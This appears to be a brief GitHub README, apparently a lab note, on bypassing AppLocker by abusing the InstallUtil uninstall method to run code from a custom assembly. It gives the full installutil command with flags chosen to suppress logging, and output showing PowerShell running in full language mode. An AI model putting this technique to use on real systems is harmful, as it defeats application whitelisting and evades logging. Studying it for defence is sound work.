Description:bypass the AppLocker executable rule by abusing the InstallUtil commmand line utility that allow us to install and unisntall server resources by executing the installer component in a assembly.
Only be using uninstall method since install method require admin priv.

References to add
<img width="1903" height="1079" alt="image" src="https://github.com/user-attachments/assets/cd524f87-76f9-4063-9863-86f2aa7f8333" />

To trigger the bypass we must invoked it through the installutil with /logfile to avoid logging to a file. 
/logfile=false to avoid.
/U to trigger the unisntall method 
```
C:\Users\User\source\repos\ConsoleApp1\ConsoleApp1\bin\x64\Release>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U ConsoleApp1.exe
Microsoft (R) .NET Framework Installation utility Version 4.8.9032.0
Copyright (C) Microsoft Corporation.  All rights reserved.


C:\Users\User\source\repos\ConsoleApp1\ConsoleApp1\bin\x64\Release>type C:\Tools\test.txt
FullLanguage
```
